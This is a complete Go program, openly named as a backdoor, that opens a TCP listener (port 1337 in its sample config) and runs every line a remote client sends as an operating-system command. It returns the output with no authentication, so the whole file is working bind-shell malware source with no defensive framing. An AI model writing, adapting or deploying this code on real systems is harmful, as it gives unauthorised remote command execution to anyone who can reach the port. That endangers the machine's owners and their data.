package main

import (
	"fmt"
	"log"
	"net"
	"strings"
	"os/exec"
	"io/ioutil"
	"encoding/json"

)

type Configuration struct {
	Socket string
	Address string
}

func backdoor(connection net.Conn) bool {
	defer connection.Close();
	var buffer [512]byte
	for {
		n, err := connection.Read(buffer[0:])
		if err != nil {
			connection.Write([]byte(err.Error()))
			return false;
		}
		packet := string(buffer[:n])
		packet = strings.TrimSuffix(packet, "\n")
		cmd := strings.Fields(packet);
		if(len(cmd) >= 1) {
			head := cmd[0];
			parts := cmd[1:len(cmd)]
			fmt.Printf("%s\r\n", packet);

			if packet == "DISCONNECT" {
				return true;
			}

			out, err := exec.Command(head, parts...).Output()
			if err != nil {
				newline := []byte("\n");
				connection.Write(append([]byte(err.Error()), newline[:]...))
			}
			n, err = connection.Write(out)
			if err != nil {
				connection.Write([]byte(err.Error()))
				return false;
			}
		}
	}
}

func main() {
	// { "Socket" : "tcp", "Address" : ":1337" }
	file, err := ioutil.ReadFile("godoor.conf")
	if err != nil {
		log.Fatal(err)
	}

	configuration := new(Configuration)

	err = json.Unmarshal(file, configuration)
	if err != nil {
		log.Fatal(err)
	}

	listener, err := net.Listen(configuration.Socket, configuration.Address)
	if err != nil {
		log.Fatal(err)
	}

	defer listener.Close()

	for {
		connection, err := listener.Accept()
		if err != nil {
			log.Fatal(err)
		}
		go backdoor(connection);
	}
}
